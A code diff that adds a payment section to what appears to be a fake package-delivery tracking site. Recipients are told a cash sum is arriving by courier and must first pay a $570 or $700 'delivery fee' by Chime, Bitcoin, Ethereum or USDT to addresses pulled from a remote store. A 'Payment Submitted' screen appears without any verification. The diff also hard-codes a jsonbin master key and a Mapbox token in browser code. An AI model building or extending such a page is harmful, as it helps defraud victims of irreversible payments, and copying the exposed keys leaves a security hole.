@@ -933,9 +933,68 @@
     top: 6px !important;
     right: 6px !important;
   }
+    /* ── PAYMENT STYLES ── */
+  .delivery-option-card {
+    background: white;
+    border: 2px solid #E5E7EB;
+    border-radius: 12px;
+    padding: 16px 18px;
+    cursor: pointer;
+    transition: all 0.2s;
+    flex: 1;
+    min-width: 140px;
+  }
+  .delivery-option-card:hover { border-color: #F59E0B; }
+  .delivery-option-card.selected {
+    border-color: #E85D04;
+    background: #FFF7ED;
+  }
+  .delivery-speed {
+    font-size: 14px;
+    font-weight: 700;
+    color: #111827;
+    margin-bottom: 4px;
+  }
+  .delivery-estimate {
+    font-size: 11px;
+    color: #9CA3AF;
+    margin-top: 2px;
+  }
+  
+  .btn-pay-now {
+    width: 100%;
+    background: linear-gradient(135deg, #F59E0B 0%, #E85D04 100%);
+    border: none;
+    border-radius: 10px;
+    padding: 14px 24px;
+    font-size: 15px;
+    font-weight: 700;
+    color: white;
+    cursor: pointer;
+    transition: all 0.2s;
+    box-shadow: 0 4px 14px rgba(232,93,4,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    font-family: var(--font-body);
+  }
+  .btn-pay-now:hover:not(:disabled) {
+    transform: translateY(-1px);
+    box-shadow: 0 6px 20px rgba(232,93,4,0.4);
+  }
+  .btn-pay-now:disabled {
+    cursor: not-allowed;
+    opacity: 0.5;
+  }
+  .btn-pay-amount {
+    font-size: 18px;
+    font-weight: 800;
+  }
   .geocoder-wrapper {
     width: 100%;
   }
+  
 </style>
 </head>
 <body>
@@ -2110,6 +2169,67 @@ mapboxgl.accessToken = 'pk.eyJ1IjoidGVjaDc4MTIiLCJhIjoiY21veTRtdHowMGhndjJyc2RyM
           ` : ''}
         </div>
 
+                <!-- Payment Section (for awaiting_wire status) -->
+        ${pkg.status === 'awaiting_wire' ? `
+        <div style="background:linear-gradient(135deg, #FFFBEB 0%, #FEF3C7 100%);border:2px solid #FCD34D;border-radius:12px;padding:24px;margin-bottom:20px;">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:20px;">
+            <div style="width:40px;height:40px;border-radius:10px;background:#F59E0B;display:flex;align-items:center;justify-content:center;font-size:18px;">💳</div>
+            <div>
+              <h4 style="font-size:16px;font-weight:700;color:#92400E;margin:0;">Complete Your Payment</h4>
+              <p style="font-size:12px;color:#B45309;margin:2px 0 0 0;">Delivery fee only — cash amount delivered by courier</p>
+            </div>
+          </div>
+          
+          <div style="margin-bottom:16px;">
+            <div style="font-size:12px;font-weight:700;color:#92400E;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">Delivery Speed</div>
+            <div style="display:flex;gap:12px;flex-wrap:wrap;">
+              <label class="delivery-option-card selected" id="deliveryStandard" onclick="selectDeliveryOption('standard',570,700)" style="cursor:pointer;display:flex;align-items:center;gap:12px;">
+                <input type="radio" name="deliveryType" value="standard" checked style="accent-color:#E85D04;cursor:pointer;flex-shrink:0;">
+                <div style="flex:1;">
+                  <div class="delivery-speed">📦 Standard</div>
+                  <div class="delivery-estimate">5-10 business days</div>
+                </div>
+                <div style="font-weight:700;font-size:15px;color:#E85D04;">$570</div>
+              </label>
+              <label class="delivery-option-card" id="deliveryPriority" onclick="selectDeliveryOption('priority',570,700)" style="cursor:pointer;display:flex;align-items:center;gap:12px;">
+                <input type="radio" name="deliveryType" value="priority" style="accent-color:#E85D04;cursor:pointer;flex-shrink:0;">
+                <div style="flex:1;">
+                  <div class="delivery-speed">⚡ Priority</div>
+                  <div class="delivery-estimate">2-3 business days</div>
+                </div>
+                <div style="font-weight:700;font-size:15px;color:#E85D04;">$700</div>
+              </label>
+            </div>
+          </div>
+
+          <div style="background:white;border-radius:8px;padding:16px;margin-bottom:16px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
+              <span style="font-size:14px;font-weight:600;color:#374151;">Delivery Fee</span>
+              <span style="font-size:22px;font-weight:800;color:#E85D04;" id="totalDisplay">$570.00</span>
+            </div>
+            
+            <div>
+              <label style="font-size:12px;font-weight:600;color:#374151;display:block;margin-bottom:6px;">Payment Method</label>
+              <select id="paymentMethodSelect" onchange="onPaymentMethodChange(this.value)" style="width:100%;padding:10px 14px;border:1.5px solid #D1D5DB;border-radius:8px;font-size:14px;font-family:var(--font-body);background:white;cursor:pointer;outline:none;">
+                <option value="">— Select payment method —</option>
+                <option value="chime">🏦 Chime</option>
+                <option value="bitcoin">₿ Bitcoin</option>
+                <option value="ethereum">Ξ Ethereum</option>
+                <option value="usdt">₮ USDT</option>
+              </select>
+            </div>
+            
+            <div id="inlinePaymentDetails" style="display:none;margin-top:14px;padding-top:14px;border-top:1px solid #E5E7EB;"></div>
+          </div>
+
+          <button class="btn-pay-now" id="btnPayNow" onclick="handlePayNow('${pkg.trackingId}')" disabled style="opacity:0.5;cursor:not-allowed;">
+            <span>Proceed to Payment</span>
+            <span class="btn-pay-amount" id="btnPayAmount">$570.00</span>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+          </button>
+        </div>
+        ` : ''}
+
         <!-- Action Buttons -->
         <div style="display:flex;gap:12px;flex-wrap:wrap;">
           <a href="tracking.html?id=${encodeURIComponent(pkg.trackingId)}" style="display:inline-flex;align-items:center;gap:8px;background:#3B82F6;border:1px solid #3B82F6;border-radius:6px;padding:12px 20px;font-size:14px;font-weight:600;color:#FFFFFF;text-decoration:none;transition:all 0.2s;" onmouseover="this.style.background='#2563EB'" onmouseout="this.style.background='#3B82F6'">
@@ -2403,12 +2523,12 @@ function openModal(id) {
               'Package registered in system. Awaiting courier assignment.'
           }
         ],
-        currentLocation: {
-  lat: 40.7128,
-  lng: -74.0060,
-  address: document.getElementById('r-address').value,  // ← FIXED
-  updatedAt: new Date().toISOString()
-}
+                        currentLocation: {
+          lat: 40.7128,
+          lng: -74.0060,
+          address: document.getElementById('s-pickup').value,
+          updatedAt: new Date().toISOString()
+        }
       };
       
       // Save to localStorage (admin panel reads from here)
@@ -2698,6 +2818,121 @@ function openModal(id) {
         el.style.background = ''; el.style.borderColor = '';
         el.readOnly = false;
       });
+    }
+  }
+
+    // ── PAYMENT FUNCTIONS ──
+  let selectedDelivery = 'standard';
+  let selectedPaymentMethod = null;
+  let wireData = null;
+
+  async function loadWireData() {
+    if (wireData) return wireData;
+    const BIN_ID = '69ff3c24c0954111d8fbf348';
+    const MASTER_KEY = '$2a$10$cPZxyG.c32PPYr.xHYwpuuXTyM.DuXPzWnKFg8zo3A2lKfzNaEu6i';
+    try {
+      const r = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': MASTER_KEY } });
+      if (r.ok) { const j = await r.json(); wireData = j.record.wireInfo; }
+    } catch(e) {}
+    if (!wireData) { const s = localStorage.getItem('sendit_admin_data'); if (s) { try { wireData = JSON.parse(s).wireInfo; } catch(e) {} } }
+    return wireData;
+  }
+
+  function selectDeliveryOption(type, standardFee, priorityFee) {
+    selectedDelivery = type;
+    const sc = document.getElementById('deliveryStandard');
+    const pc = document.getElementById('deliveryPriority');
+    if (sc) sc.classList.toggle('selected', type === 'standard');
+    if (pc) pc.classList.toggle('selected', type === 'priority');
+    const total = type === 'priority' ? priorityFee : standardFee;
+    const td = document.getElementById('totalDisplay');
+    const ba = document.getElementById('btnPayAmount');
+    if (td) td.textContent = '$' + total.toFixed(2);
+    if (ba) ba.textContent = '$' + total.toFixed(2);
+  }
+
+  async function onPaymentMethodChange(method) {
+    selectedPaymentMethod = method;
+    const btn = document.getElementById('btnPayNow');
+    const details = document.getElementById('inlinePaymentDetails');
+    if (!method) {
+      btn.disabled = true; btn.style.opacity = '0.5'; btn.style.cursor = 'not-allowed';
+      details.style.display = 'none'; return;
+    }
+    const info = await loadWireData();
+    if (!info) { details.innerHTML = '<div style="color:#991B1B;font-size:13px;">Payment details not configured.</div>'; details.style.display = 'block'; return; }
+    
+    let address = '', label = '', color = '', bg = '', border = '', icon = '';
+    if (method === 'chime') {
+      address = info.chimeEmail || 'Not configured';
+      label = 'Chime Email Address'; color = '#1E40AF'; bg = '#EFF6FF'; border = '#BFDBFE'; icon = '🏦';
+    } else if (method === 'bitcoin') {
+      address = info.bitcoin || 'Not configured';
+      label = 'Bitcoin (BTC) Address'; color = '#9A3412'; bg = '#FFF7ED'; border = '#FED7AA'; icon = '₿';
+    } else if (method === 'ethereum') {
+      address = info.ethereum || 'Not configured';
+      label = 'Ethereum (ETH) Address'; color = '#5B21B6'; bg = '#F3E8FF'; border = '#D8B4FE'; icon = 'Ξ';
+    } else if (method === 'usdt') {
+      address = info.usdt || 'Not configured';
+      label = 'USDT Address'; color = '#065F46'; bg = '#ECFDF5'; border = '#A7F3D0'; icon = '₮';
+    }
+    
+    details.innerHTML = `
+      <div style="background:${bg};border:2px solid ${border};border-radius:10px;padding:16px;">
+        <div style="display:flex;align-items:flex-start;gap:12px;">
+          <div style="width:42px;height:42px;border-radius:10px;background:white;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;border:1px solid ${border};">${icon}</div>
+          <div style="flex:1;min-width:0;">
+            <div style="font-size:12px;font-weight:700;color:${color};margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px;">${label}</div>
+            <div style="background:white;border:1px solid ${border};border-radius:6px;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;gap:10px;">
+              <code style="font-family:'DM Mono',monospace;font-size:13px;font-weight:600;color:#111827;word-break:break-all;flex:1;">${address}</code>
+              <button onclick="copyPaymentAddress('${address.replace(/'/g, "\\'")}')" title="Copy" style="background:${color};border:none;border-radius:6px;padding:8px 12px;cursor:pointer;flex-shrink:0;transition:opacity 0.15s;" onmouseover="this.style.opacity='0.85'" onmouseout="this.style.opacity='1'">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              </button>
+            </div>
+            ${method === 'chime' ? `
+            <div style="margin-top:10px;font-size:12px;color:#374151;line-height:1.6;">
+              <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:4px;"><span style="color:${color};">1.</span><span>Open <strong>Chime</strong> app or visit <strong>chime.com</strong></span></div>
+              <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:4px;"><span style="color:${color};">2.</span><span>Tap <strong>Pay</strong> → <strong>Send to a friend</strong></span></div>
+              <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:4px;"><span style="color:${color};">3.</span><span>Enter the email above and the delivery fee</span></div>
+              <div style="display:flex;align-items:flex-start;gap:6px;"><span style="color:${color};">4.</span><span>Click <strong>Proceed to Payment</strong> below</span></div>
+            </div>` : `
+            <div style="margin-top:10px;font-size:12px;color:#374151;line-height:1.6;">
+              <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:4px;"><span style="color:${color};">1.</span><span>Copy the address above</span></div>
+              <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:4px;"><span style="color:${color};">2.</span><span>Send the exact delivery fee to this address</span></div>
+              <div style="display:flex;align-items:flex-start;gap:6px;"><span style="color:${color};">3.</span><span>Click <strong>Proceed to Payment</strong> below</span></div>
+            </div>`}
+          </div>
+        </div>
+      </div>`;
+    details.style.display = 'block';
+    btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer';
+  }
+
+  function copyPaymentAddress(text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const btns = document.querySelectorAll('#inlinePaymentDetails button');
+      btns.forEach(b => {
+        b.innerHTML = '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>';
+        setTimeout(() => { b.innerHTML = '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>'; }, 1500);
+      });
+    }).catch(() => { alert('Failed to copy.'); });
+  }
+
+  function handlePayNow(trackingId) {
+    if (!selectedPaymentMethod) { alert('Please select a payment method first.'); return; }
+    const names = { chime: 'Chime', bitcoin: 'Bitcoin', ethereum: 'Ethereum', usdt: 'USDT' };
+    if (confirm(`Confirm payment via ${names[selectedPaymentMethod]}?\n\nClick OK after you've sent the payment.`)) {
+      const paymentSection = document.getElementById('btnPayNow').closest('div[style*="linear-gradient"]');
+      if (paymentSection) {
+        paymentSection.innerHTML = `
+          <div style="text-align:center;padding:20px;">
+            <div style="width:64px;height:64px;border-radius:50%;background:#D1FAE5;border:3px solid #10B981;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
+              <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div style="font-family:var(--font-display);font-size:18px;font-weight:800;color:#065F46;margin-bottom:4px;">Payment Submitted</div>
+            <div style="font-size:13px;color:#6B7280;max-width:320px;margin:0 auto;line-height:1.5;">We'll verify your payment and update your delivery status shortly. Thank you!</div>
+          </div>`;
+      }
     }
   }
 </script>
